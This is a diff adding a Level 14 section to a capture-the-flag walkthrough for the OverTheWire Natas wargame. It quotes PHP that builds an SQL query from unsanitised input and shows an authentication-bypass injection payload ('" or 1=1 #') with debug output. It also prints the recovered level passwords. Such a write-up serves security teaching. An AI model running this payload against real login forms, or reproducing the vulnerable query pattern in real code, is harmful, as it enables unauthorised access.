@@ -825,3 +825,107 @@ script.php: JPEG image data
 We got it! Time to upload the script repeating the same process as Level 12. Edit the HTML so the file will get uploaded as `.php` and repeat the process!
 
 We get `����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`, removing the first 4 bytes we get the password!
+
+# Level 14
+
+Thirteen down! Only, 20 more to go...
+Let's get to work then!
+
+We are greeted with a login prompt and the link to its source code.
+
+```php
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas14', '<censored>');
+    mysql_select_db('natas14', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+        echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+        echo "Access denied!<br>";
+    }
+    mysql_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<? } ?>
+```
+
+Straight up we see some SQL!
+
+```php
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST
+```
+
+And then this:
+
+```php
+if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+    echo "Successful login! The password for natas15 is <censored><br>";
+} else {
+    echo "Access denied!<br>";
+}
+```
+
+So this should be a SQL Injection attack.
+
+Let's start by looking at the query, in plain SQL it looks like this.
+
+```sql
+SELECT * FROM users WHERE username=? AND password=?
+```
+
+However there is no input sanitization, so we start by breaking it with a simple `"` (use the debug flag for a better understanding of what is going on).
+
+```http
+http://natas14.natas.labs.overthewire.org/index.php?debug&username="
+```
+
+We receive the following error message:
+
+```txt
+Notice: Undefined index: password in /var/www/natas/natas14/index.php on line 19
+Executing query: SELECT * from users where username=""" and password=""
+
+Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
+Access denied!
+```
+
+We sucessfully broke the query!
+Moving on to textbook SQLi.
+
+```http
+http://natas14.natas.labs.overthewire.org/index.php?debug&username=natas15&password=" or 1=1 #
+```
+
+*Note: use the url escaped form of the query or else it won't work*
+
+The query as seen by the server is:
+
+```sql
+SELECT * from users where username="natas15" and password="" or 1=1 #"
+```
+
+You might be thinking why the query evaluates to `true` given that there is no user with an empty password, or so we assume.
+
+Looking at the MySQL documentation for [operator precedence](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html), we see `AND` has an higher precedence than `OR`, which results in the following AST.
+
+![Logical AST](/otw_natas/level14.svg)
+
+This way we can see the `AND` gets evaluated first and the `OR` afterwards, resulting in `TRUE` for all collumns.
+
+Finally we get:
+
+```txt
+Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
